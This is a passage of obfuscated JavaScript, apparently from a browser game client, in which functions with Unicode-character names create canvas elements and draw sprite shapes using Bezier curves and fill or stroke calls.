			Δ.bezierCurveTo(128 * ᐃ, 68 * ᐃ, 128 * ᐃ, 76 * ᐃ, 126 * ᐃ, 79 * ᐃ);
			Δ.bezierCurveTo(123 * ᐃ, ᐃ * 84, ᐃ * 122, ᐃ * 82, ᐃ * 115, ᐃ * 74);
			Δ.bezierCurveTo(112 * ᐃ, ᐃ * 67, ᐃ * 115, 74 * ᐃ, ᐃ * 115, 74 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 111, 68 * ᐃ, ᐃ * 111, ᐃ * 66, ᐃ * 111, 62 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[0]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(107 * ᐃ, 81 * ᐃ);
			Δ.bezierCurveTo(108 * ᐃ, 74 * ᐃ, 112 * ᐃ, ᐃ * 73, 118 * ᐃ, 84 * ᐃ);
			Δ.bezierCurveTo(122 * ᐃ, ᐃ * 88, ᐃ * 122, 93 * ᐃ, ᐃ * 121, 98 * ᐃ);
			Δ.bezierCurveTo(114 * ᐃ, 98 * ᐃ, ᐃ * 113, 98 * ᐃ, 109 * ᐃ, 90 * ᐃ);
			Δ.bezierCurveTo(107 * ᐃ, ᐃ * 87, 106 * ᐃ, 85 * ᐃ, ᐃ * 107, ᐃ * 82);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ΔⲆⲆ]);
			return Ⲇⵠ
		}

		function ΔΔΔΔⵠ(ᐃ, Ⲇᐃ) {
			var Ⲇⵠ = document[ΔᐃⲆⵠⲆⵠΔ[224]](ⵠ[488]);
			var Δ = Ⲇⵠ.getContext(ⵠ[289]);
			Ⲇⵠ.width = 20 * ᐃ;
			Ⲇⵠ.height = 35 * ᐃ;
			Ⲇᐃᐃ(Δ, ΔⲆⲆ, 0, ᐃⲆᐃΔⵠ, 35, ⵠΔⵠΔⵠΔⵠ);
			ΔⲆ(Δ, Ⲇᐃ[ΔⲆⲆ]);
			return Ⲇⵠ
		}

		function ΔⲆⵠΔΔⲆᐃⲆⲆ(ᐃ, Ⲇᐃ) {
			var Ⲇⵠ = document[ΔᐃⲆⵠⲆⵠΔ[224]](ⵠ[488]);
			var Δ = Ⲇⵠ.getContext(ⵠ[289]);
			Ⲇⵠ.width = ᐃ * 161;
			Ⲇⵠ.height = 190 * ᐃ;
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ⲆΔⲆᐃ];
			Δ.moveTo(9 * ᐃ, 93 * ᐃ);
			Δ.bezierCurveTo(ⵠⲆᐃⵠⵠΔⵠ * ᐃ, 95 * ᐃ, 19 * ᐃ, ᐃ * 95, 21 * ᐃ, 95 * ᐃ);
			Δ.bezierCurveTo(ΔᐃΔᐃⲆΔΔ * ᐃ, ᐃ * 83, ⲆⵠᐃΔᐃ * ᐃ, ᐃ * 93, ⲆⵠᐃⲆ * ᐃ, ᐃ * 76);
			Δ.bezierCurveTo(ᐃ * ⲆΔᐃⵠᐃ, ᐃ * 75, ᐃ * ΔΔΔΔⲆⵠⲆ, 75 * ᐃ, ⲆⵠΔⵠⵠ * ᐃ, ᐃ * 75);
			Δ.bezierCurveTo(ΔⵠⲆΔⲆⲆᐃ * ᐃ, ᐃ * 67, ᐃ * 13, 67 * ᐃ, 7 * ᐃ, 59 * ᐃ);
			Δ.bezierCurveTo(14 * ᐃ, ᐃ * 59, 14 * ᐃ, ᐃ * 59, ᐃ * 21, 59 * ᐃ);
			Δ.bezierCurveTo(46 * ᐃ, ᐃ * 35, ᐃ * 35, ᐃ * 45, ᐃ * 49, ᐃ * 31);
			Δ.bezierCurveTo(53 * ᐃ, ᐃ * 24, ᐃ * 51, ᐃ * 21, ᐃ * 51, ᐃ * 16);
			Δ.bezierCurveTo(63 * ᐃ, 23 * ᐃ, ᐃ * 63, 24 * ᐃ, 69 * ᐃ, ᐃ * 29);
			Δ.bezierCurveTo(ᐃ * 76, ᐃ * ΔΔᐃⲆⲆ, 75 * ᐃ, ᐃ * 11, 76 * ᐃ, 6 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 81, ⲆΔⲆΔⲆ * ᐃ, ᐃ * 84, ᐃ * 18, 89 * ᐃ, 27 * ᐃ);
			Δ.bezierCurveTo(95 * ᐃ, 25 * ᐃ, 100 * ᐃ, 16 * ᐃ, ᐃ * 105, ⵠⲆⲆⵠΔⵠⲆ * ᐃ);
			Δ.bezierCurveTo(ᐃ * 103, ᐃ * 25, 111 * ᐃ, ᐃ * 33, ᐃ * 110, ᐃ * 34);
			Δ.bezierCurveTo(123 * ᐃ, 48 * ᐃ, ᐃ * 123, ᐃ * 48, 136 * ᐃ, ᐃ * 62);
			Δ.bezierCurveTo(ᐃ * 142, 60 * ᐃ, 147 * ᐃ, 59 * ᐃ, ᐃ * 155, 58 * ᐃ);
			Δ.bezierCurveTo(147 * ᐃ, 65 * ᐃ, ᐃ * 147, 65 * ᐃ, 139 * ᐃ, ᐃ * 73);
			Δ.bezierCurveTo(ᐃ * 145, ᐃ * 73, ᐃ * 145, ᐃ * 73, ᐃ * 151, 73 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 145, 80 * ᐃ, 145 * ᐃ, ᐃ * 80, ᐃ * 138, ᐃ * 87);
			Δ.bezierCurveTo(ᐃ * 144, ᐃ * 88, 144 * ᐃ, 88 * ᐃ, ᐃ * 150, 89 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 125, ᐃ * 103, 125 * ᐃ, ᐃ * 125, 113 * ᐃ, 141 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 92, ᐃ * 178, ᐃ * 85, 177 * ᐃ, 76 * ᐃ, 178 * ᐃ);
			Δ.bezierCurveTo(64 * ᐃ, ᐃ * 179, 51 * ᐃ, 164 * ᐃ, ᐃ * 35, 131 * ᐃ);
			Δ.bezierCurveTo(ⲆⲆᐃᐃΔⵠⵠ * ᐃ, 95 * ᐃ, ᐃ * Δⵠᐃⵠⵠ, ᐃ * 99, ᐃ * 8, ᐃ * 93);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ, Ⲇᐃ, ᐃ * ⲆⵠΔⵠ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⲆΔⲆᐃ];
			Δ.lineJoin = ⵠ[ΔΔᐃⲆ];
			Δ.moveTo(ᐃ * 25, 63 * ᐃ);
			Δ.bezierCurveTo(16 * ᐃ, ᐃ * 58, ⵠᐃⵠⲆⲆ * ᐃ, 51 * ᐃ, ⲆⵠᐃΔᐃ * ᐃ, 33 * ᐃ);
			Δ.bezierCurveTo(19 * ᐃ, ᐃ * ⵠⲆᐃᐃⲆ, ᐃ * 21, ᐃᐃΔᐃⲆ * ᐃ, ᐃ * 32, ΔΔΔᐃᐃⵠΔ * ᐃ);
			Δ.bezierCurveTo(ᐃ * 63, 31 * ᐃ, 66 * ᐃ, ᐃ * 45, 66 * ᐃ, 54 * ᐃ);
			ΔⲆ(Δ, Ⲇᐃ, Ⲇᐃ, 4 * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ᐃᐃⲆᐃ];
			Δ.moveTo(ᐃ * 91, ᐃ * 53);
			Δ.bezierCurveTo(ᐃ * 91, 40 * ᐃ, 98 * ᐃ, ᐃ * 33, 121 * ᐃ, ⵠΔΔⲆⲆ * ᐃ);
			Δ.bezierCurveTo(ᐃ * 137, 12 * ᐃ, 137 * ᐃ, ᐃ * 16, ᐃ * 139, ᐃ * 27);
			Δ.bezierCurveTo(141 * ᐃ, ᐃ * 49, 140 * ᐃ, ᐃ * 57, ᐃ * 134, 64 * ᐃ);
			ΔⲆ(Δ, Ⲇᐃ, Ⲇᐃ, ᐃ * 4);
			return Ⲇⵠ
		}

		function ᐃᐃⵠᐃⵠᐃⵠ(ᐃ, Ⲇᐃ) {
			var Ⲇⵠ = document[ΔᐃⲆⵠⲆⵠΔ[224]](ⵠ[488]);
			var Δ = Ⲇⵠ.getContext(ⵠ[289]);
			Ⲇⵠ.width = ᐃ * 48;
			Ⲇⵠ.height = 47 * ᐃ;
			Δ.beginPath();
			Δ.lineCap = ⵠ[ᐃⲆⵠΔ];
			Δ.lineJoin = ⵠ[ⲆΔΔᐃ];
			Δ.moveTo(7.1875 * ᐃ, 25.434661865234375 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 11.1875, ᐃ * 13.434661865234375, ᐃ * 18.1875, 8.434661865234375 * ᐃ, ᐃ * 32.1875, 10.434661865234375 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 45.1875, 14.434661865234375 * ᐃ, ᐃ * 41.1875, ᐃ * 24.434661865234375, ᐃ * 36.1875, ᐃ * 30.434661865234375);
			Δ.bezierCurveTo(22.1875 * ᐃ, 42.434661865234375 * ᐃ, 2.1875 * ᐃ, 41.434661865234375 * ᐃ, 7.1875 * ᐃ, 25.434661865234375 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[0]);
			return Ⲇⵠ
		}

		function ⵠΔᐃⵠΔⲆⵠ(ᐃ, Ⲇᐃ) {
			var Ⲇⵠ = document[ΔᐃⲆⵠⲆⵠΔ[224]](ⵠ[488]);
			var Δ = Ⲇⵠ.getContext(ⵠ[289]);
			Ⲇⵠ.width = 271 * ᐃ;
			Ⲇⵠ.height = ᐃ * 366;
			Δ.globalAlpha = .5;
			Δ.translate(0, ᐃ * ⵠⵠⲆΔΔ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(133 * ᐃ, 99 * ᐃ);
			Δ.bezierCurveTo(186 * ᐃ, 123 * ᐃ, ᐃ * 199, 152 * ᐃ, 209 * ᐃ, ᐃ * 169);
			Δ.bezierCurveTo(228 * ᐃ, 205 * ᐃ, ᐃ * 224, 245 * ᐃ, 190 * ᐃ, 276 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 161, ᐃ * 296, ᐃ * 99, ᐃ * 292, ᐃ * 79, 274 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 49, 253 * ᐃ, ᐃ * 47, ᐃ * 214, ᐃ * 50, ᐃ * 197);
			Δ.bezierCurveTo(61 * ᐃ, ᐃ * 143, ᐃ * 102, ᐃ * 113, 131 * ᐃ, ᐃ * 99);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ⵠᐃⲆᐃ]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ᐃⲆⵠΔ];
			Δ.moveTo(ᐃ * 73, 270 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 79, ᐃ * 280, 77 * ᐃ, 280 * ᐃ, 78 * ᐃ, ᐃ * 287);
			Δ.bezierCurveTo(78 * ᐃ, 290 * ᐃ, 83 * ᐃ, 291 * ᐃ, 82 * ᐃ, ᐃ * 299);
			Δ.bezierCurveTo(ᐃ * 81, 301 * ᐃ, 87 * ᐃ, 301 * ᐃ, ᐃ * 92, 314 * ᐃ);
			Δ.bezierCurveTo(94 * ᐃ, 319 * ᐃ, ᐃ * 100, 321 * ᐃ, ᐃ * 107, ᐃ * 320);
			Δ.bezierCurveTo(111 * ᐃ, ᐃ * 323, ᐃ * 114, ᐃ * 324, 119 * ᐃ, ᐃ * 320);
			Δ.bezierCurveTo(137 * ᐃ, 321 * ᐃ, 146 * ᐃ, ᐃ * 323, 139 * ᐃ, ᐃ * 320);
			Δ.bezierCurveTo(ᐃ * 141, ᐃ * 324, 150 * ᐃ, 324 * ᐃ, ᐃ * 153, 320 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 168, ᐃ * 319, 171 * ᐃ, ᐃ * 316, ᐃ * 173, ᐃ * 307);
			Δ.bezierCurveTo(ᐃ * 180, 305 * ᐃ, ᐃ * 180, 301 * ᐃ, ᐃ * 178, ᐃ * 296);
			Δ.bezierCurveTo(ᐃ * 183, 296 * ᐃ, 185 * ᐃ, ᐃ * 289, ᐃ * 188, 279 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 171, ᐃ * 286, 149 * ᐃ, 290 * ᐃ, 132 * ᐃ, ᐃ * 289);
			Δ.bezierCurveTo(101 * ᐃ, ᐃ * 290, ᐃ * 86, ᐃ * 280, 74 * ᐃ, ᐃ * 271);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[0]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⲆΔΔᐃ];
			Δ.lineJoin = ⵠ[ᐃΔΔⲆ];
			Δ.moveTo(ᐃ * 76, ᐃ * 252);
			Δ.bezierCurveTo(85 * ᐃ, 294 * ᐃ, 96 * ᐃ, 314 * ᐃ, 103 * ᐃ, 314 * ᐃ);
			Δ.bezierCurveTo(106 * ᐃ, 316 * ᐃ, ᐃ * 151, ᐃ * 314, ᐃ * 156, ᐃ * 314);
			Δ.bezierCurveTo(ᐃ * 169, 317 * ᐃ, 182 * ᐃ, 285 * ᐃ, 191 * ᐃ, ⵠⵠⵠΔΔΔΔ * ᐃ);
			Δ.bezierCurveTo(134.5 * ᐃ, ᐃ * 254, 134.5 * ᐃ, 254 * ᐃ, 78 * ᐃ, 252 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ⲆΔⵠ]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ᐃΔΔⲆ];
			Δ.moveTo(84 * ᐃ, 257 * ᐃ);
			Δ.bezierCurveTo(122 * ᐃ, ᐃ * 273, ᐃ * 146, 268 * ᐃ, ᐃ * 179, ᐃ * 261);
			Δ.bezierCurveTo(ᐃ * 190, ᐃ * 258, 187 * ᐃ, ᐃ * 266, 178 * ᐃ, ᐃ * 272);
			Δ.bezierCurveTo(160 * ᐃ, ᐃ * 284, 123 * ᐃ, ᐃ * 282, ⲆᐃΔⵠⵠ * ᐃ, ᐃ * 277);
			Δ.bezierCurveTo(ᐃ * 73, 260 * ᐃ, ᐃ * 79, ᐃ * 257, 84 * ᐃ, ᐃ * 257);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[0]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 125, 65 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 133, ᐃ * 45, 136 * ᐃ, 42 * ᐃ, 141 * ᐃ, ᐃ * 55);
			Δ.bezierCurveTo(ᐃ * 151, 96 * ᐃ, ᐃ * 164, ᐃ * 117, ᐃ * 175, 134 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 203, ᐃ * 181, ᐃ * 207, ᐃ * 182, ᐃ * 208, 215 * ᐃ);
			Δ.bezierCurveTo(206 * ᐃ, ᐃ * 240, ᐃ * 205, ᐃ * 246, 184 * ᐃ, 258 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 161, 267 * ᐃ, 131 * ᐃ, 272 * ᐃ, 86 * ᐃ, ᐃ * 258);
			Δ.bezierCurveTo(67 * ᐃ, ᐃ * 252, 68 * ᐃ, ᐃ * 239, ᐃ * 64, ᐃ * 216);
			Δ.bezierCurveTo(62 * ᐃ, ᐃ * 194, ᐃ * 72, ᐃ * 169, 92 * ᐃ, 142 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 106, ᐃ * 121, 114 * ᐃ, ᐃ * 101, 125 * ᐃ, 65 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[Ⲇᐃⵠⵠ]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⵠⲆᐃᐃ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 115, ᐃ * 37);
			Δ.bezierCurveTo(116 * ᐃ, 28 * ᐃ, ᐃ * 119, ᐃ * 27, 126 * ᐃ, ᐃ * 37);
			Δ.bezierCurveTo(ᐃ * 134, 48 * ᐃ, 134 * ᐃ, 49 * ᐃ, ᐃ * 132, ᐃ * 59);
			Δ.bezierCurveTo(ᐃ * 131, 67 * ᐃ, 127 * ᐃ, 65 * ᐃ, 120 * ᐃ, 56 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 114, 49 * ᐃ, ᐃ * 113, ᐃ * 43, 115 * ᐃ, ᐃ * 38);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ΔⲆⲆ]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ⲆΔΔᐃ];
			Δ.moveTo(ᐃ * 146, 34 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 152, 28 * ᐃ, ᐃ * 155, 27 * ᐃ, 157 * ᐃ, ᐃ * 39);
			Δ.bezierCurveTo(157 * ᐃ, ᐃ * 45, 157 * ᐃ, ᐃ * 49, ᐃ * 150, 56 * ᐃ);
			Δ.bezierCurveTo(141 * ᐃ, 66 * ᐃ, 138 * ᐃ, 66 * ᐃ, 138 * ᐃ, ᐃ * 57);
			Δ.bezierCurveTo(137 * ᐃ, ᐃ * 50, 137 * ᐃ, ᐃ * 47, ᐃ * 141, 42 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[0]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 143, ᐃ * 69);
			Δ.bezierCurveTo(ᐃ * 148, 56 * ᐃ, 156 * ᐃ, ᐃ * 50, 158 * ᐃ, ᐃ * 58);
			Δ.bezierCurveTo(159 * ᐃ, 64 * ᐃ, ᐃ * 160, ᐃ * 67, ᐃ * 153, 77 * ᐃ);
			Δ.bezierCurveTo(148 * ᐃ, 83 * ᐃ, ᐃ * 145, ᐃ * 84, ᐃ * 143, ᐃ * 77);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ΔΔⵠ]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⵠⵠΔⵠ];
			Δ.lineJoin = ⵠ[ΔΔᐃⲆ];
			Δ.moveTo(ᐃ * 149, 92 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 149, ᐃ * 89, 151 * ᐃ, ᐃ * 84, ᐃ * 156, ᐃ * 79);
			Δ.bezierCurveTo(ᐃ * 161, ᐃ * 73, ᐃ * 163, ᐃ * 78, ᐃ * 162, 86 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 161, 91 * ᐃ, 155 * ᐃ, ᐃ * 99, 152 * ᐃ, 98 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[0]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⵠⲆᐃᐃ];
			Δ.lineJoin = ⵠ[ᐃΔΔΔ];
			Δ.moveTo(111 * ᐃ, 61 * ᐃ);
			Δ.bezierCurveTo(114 * ᐃ, 51 * ᐃ, ᐃ * 117, 51 * ᐃ, ᐃ * 124, ᐃ * 64);
			Δ.bezierCurveTo(ᐃ * 128, ᐃ * 68, 128 * ᐃ, ᐃ * 76, 126 * ᐃ, ᐃ * 79);
			Δ.bezierCurveTo(ᐃ * 123, ᐃ * 84, ᐃ * 122, 82 * ᐃ, ᐃ * 115, 74 * ᐃ);
			Δ.bezierCurveTo(112 * ᐃ, ᐃ * 67, ᐃ * 115, ᐃ * 74, 115 * ᐃ, 74 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 111, ᐃ * 68, 111 * ᐃ, ᐃ * 66, 111 * ᐃ, ᐃ * 62);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ᐃΔΔ]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ⵠⲆⵠⵠ];
			Δ.moveTo(107 * ᐃ, ᐃ * 81);
			Δ.bezierCurveTo(108 * ᐃ, ᐃ * 74, ᐃ * 112, 73 * ᐃ, 118 * ᐃ, 84 * ᐃ);
			Δ.bezierCurveTo(122 * ᐃ, ᐃ * 88, 122 * ᐃ, ᐃ * 93, ᐃ * 121, 98 * ᐃ);
			Δ.bezierCurveTo(114 * ᐃ, ᐃ * 98, 113 * ᐃ, ᐃ * 98, ᐃ * 109, 90 * ᐃ);
			Δ.bezierCurveTo(107 * ᐃ, ᐃ * 87, 106 * ᐃ, ᐃ * 85, ᐃ * 107, ᐃ * 82);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[0]);
			Δ.globalAlpha = 1;
			Δ.translate(0, ᐃ * -ᐃᐃⲆⵠⵠ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(133 * ᐃ, 99 * ᐃ);
			Δ.bezierCurveTo(186 * ᐃ, ᐃ * 123, 199 * ᐃ, ᐃ * 152, 209 * ᐃ, ᐃ * 169);
			Δ.bezierCurveTo(228 * ᐃ, 205 * ᐃ, 224 * ᐃ, 245 * ᐃ, 190 * ᐃ, ᐃ * 276);
			Δ.bezierCurveTo(ᐃ * 161, ᐃ * 296, ᐃ * 99, ᐃ * 292, 79 * ᐃ, ᐃ * 274);
			Δ.bezierCurveTo(ᐃ * 49, ᐃ * 253, ᐃ * 47, ᐃ * 214, 50 * ᐃ, ᐃ * 197);
			Δ.bezierCurveTo(61 * ᐃ, ᐃ * 143, 102 * ᐃ, ᐃ * 113, 131 * ᐃ, ᐃ * 99);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ΔΔᐃΔ], Ⲇᐃ[3], ⵠⵠᐃΔⲆ * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ᐃΔΔⲆ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 73, ᐃ * 270);
			Δ.bezierCurveTo(ᐃ * 79, ᐃ * 280, ᐃ * 77, ᐃ * 280, ᐃ * 78, 287 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 78, 290 * ᐃ, ᐃ * 83, ᐃ * 291, ᐃ * 82, 299 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 81, ᐃ * 301, 87 * ᐃ, 301 * ᐃ, ᐃ * 92, 314 * ᐃ);
			Δ.bezierCurveTo(94 * ᐃ, ᐃ * 319, ΔΔⲆⵠΔⲆⵠ * ᐃ, 321 * ᐃ, 107 * ᐃ, ᐃ * 320);
			Δ.bezierCurveTo(ᐃ * 111, ᐃ * 323, 114 * ᐃ, 324 * ᐃ, 119 * ᐃ, ᐃ * 320);
			Δ.bezierCurveTo(137 * ᐃ, ᐃ * 321, ᐃ * 146, ᐃ * 323, ᐃ * 139, ᐃ * 320);
			Δ.bezierCurveTo(ᐃ * 141, 324 * ᐃ, ᐃ * 150, ᐃ * 324, 153 * ᐃ, 320 * ᐃ);
			Δ.bezierCurveTo(168 * ᐃ, ᐃ * 319, 171 * ᐃ, 316 * ᐃ, 173 * ᐃ, 307 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 180, ᐃ * 305, ᐃ * 180, 301 * ᐃ, 178 * ᐃ, ᐃ * 296);
			Δ.bezierCurveTo(183 * ᐃ, ᐃ * 296, 185 * ᐃ, ᐃ * 289, ᐃ * 188, ᐃ * 279);
			Δ.bezierCurveTo(ᐃ * 171, ᐃ * 286, 149 * ᐃ, ᐃ * 290, 132 * ᐃ, 289 * ᐃ);
			Δ.bezierCurveTo(101 * ᐃ, 290 * ᐃ, 86 * ᐃ, 280 * ᐃ, ᐃ * 74, 271 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ⵠᐃⵠⲆ], Ⲇᐃ[ΔⲆᐃⲆ], ᐃ * 8);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ᐃⲆⵠⵠ];
			Δ.lineJoin = ⵠ[ⵠⵠΔΔ];
			Δ.moveTo(76 * ᐃ, 252 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 85, ᐃ * 294, 96 * ᐃ, 314 * ᐃ, 103 * ᐃ, 314 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 106, 316 * ᐃ, 151 * ᐃ, ᐃ * 314, 156 * ᐃ, 314 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 169, 317 * ᐃ, ᐃ * 182, ᐃ * 285, 191 * ᐃ, ᐃ * 256);
			Δ.bezierCurveTo(ᐃ * 134.5, 254 * ᐃ, ᐃ * 134.5, 254 * ᐃ, 78 * ᐃ, 252 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[3], Ⲇᐃ[ΔᐃⲆΔ], ᐃᐃⵠᐃᐃΔΔ * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(84 * ᐃ, ᐃ * 257);
			Δ.bezierCurveTo(122 * ᐃ, ᐃ * 273, ᐃ * 146, ᐃ * 268, 179 * ᐃ, ᐃ * 261);
			Δ.bezierCurveTo(190 * ᐃ, 258 * ᐃ, 187 * ᐃ, 266 * ᐃ, ᐃ * 178, ᐃ * 272);
			Δ.bezierCurveTo(ᐃ * 160, ᐃ * 284, ᐃ * 123, ᐃ * 282, ⲆⵠᐃΔⲆ * ᐃ, 277 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 73, ᐃ * 260, ᐃ * 79, 257 * ᐃ, ᐃ * 84, ᐃ * 257);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ΔᐃⲆΔ], Ⲇᐃ[ᐃⲆᐃᐃ], ΔᐃᐃⲆᐃ * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ⲆΔⲆᐃ];
			Δ.moveTo(125 * ᐃ, 65 * ᐃ);
			Δ.bezierCurveTo(133 * ᐃ, ᐃ * 45, ᐃ * 136, ᐃ * 42, ᐃ * 141, 55 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 151, ᐃ * 96, ᐃ * 164, 117 * ᐃ, 175 * ᐃ, 134 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 203, ᐃ * 181, 207 * ᐃ, 182 * ᐃ, 208 * ᐃ, ᐃ * 215);
			Δ.bezierCurveTo(ᐃ * 206, 240 * ᐃ, 205 * ᐃ, 246 * ᐃ, 184 * ᐃ, 258 * ᐃ);
			Δ.bezierCurveTo(161 * ᐃ, 267 * ᐃ, 131 * ᐃ, 272 * ᐃ, ᐃ * 86, ᐃ * 258);
			Δ.bezierCurveTo(ᐃ * 67, ᐃ * 252, ᐃ * 68, 239 * ᐃ, 64 * ᐃ, ᐃ * 216);
			Δ.bezierCurveTo(ᐃ * 62, 194 * ᐃ, 72 * ᐃ, ᐃ * 169, ᐃ * 92, 142 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 106, ᐃ * 121, ᐃ * 114, 101 * ᐃ, 125 * ᐃ, ᐃ * 65);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[3], Ⲇᐃ[ΔΔⵠΔ], ᐃ * 8);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ᐃΔΔΔ];
			Δ.lineJoin = ⵠ[ⲆΔΔᐃ];
			Δ.moveTo(ᐃ * 115, ᐃ * 37);
			Δ.bezierCurveTo(ᐃ * 116, 28 * ᐃ, ᐃ * 119, 27 * ᐃ, ᐃ * 126, 37 * ᐃ);
			Δ.bezierCurveTo(134 * ᐃ, 48 * ᐃ, 134 * ᐃ, ᐃ * 49, ᐃ * 132, 59 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 131, 67 * ᐃ, ᐃ * 127, 65 * ᐃ, ᐃ * 120, 56 * ᐃ);
			Δ.bezierCurveTo(114 * ᐃ, 49 * ᐃ, ᐃ * 113, ᐃ * 43, ᐃ * 115, 38 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[3], Ⲇᐃ[ⵠⲆΔⵠΔ], ᐃ * 8);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ΔⲆΔΔ];
			Δ.moveTo(ᐃ * 146, 34 * ᐃ);
			Δ.bezierCurveTo(152 * ᐃ, ᐃ * 28, 155 * ᐃ, 27 * ᐃ, ᐃ * 157, 39 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 157, ᐃ * 45, ᐃ * 157, 49 * ᐃ, ᐃ * 150, ᐃ * 56);
			Δ.bezierCurveTo(141 * ᐃ, 66 * ᐃ, ᐃ * 138, ᐃ * 66, ᐃ * 138, 57 * ᐃ);
			Δ.bezierCurveTo(137 * ᐃ, 50 * ᐃ, ᐃ * 137, ᐃ * 47, ᐃ * 141, 42 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ᐃᐃⲆΔⵠ], Ⲇᐃ[ⲆᐃΔᐃ], ΔⲆᐃⵠⲆΔⵠ * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⲆΔΔᐃ];
			Δ.lineJoin = ⵠ[ⵠᐃⲆΔ];
			Δ.moveTo(143 * ᐃ, 69 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 148, ᐃ * 56, 156 * ᐃ, 50 * ᐃ, 158 * ᐃ, 58 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 159, 64 * ᐃ, 160 * ᐃ, 67 * ᐃ, 153 * ᐃ, 77 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 148, 83 * ᐃ, 145 * ᐃ, ᐃ * 84, 143 * ᐃ, ᐃ * 77);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ΔΔⵠΔ], Ⲇᐃ[Δⵠᐃⵠ], 8 * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
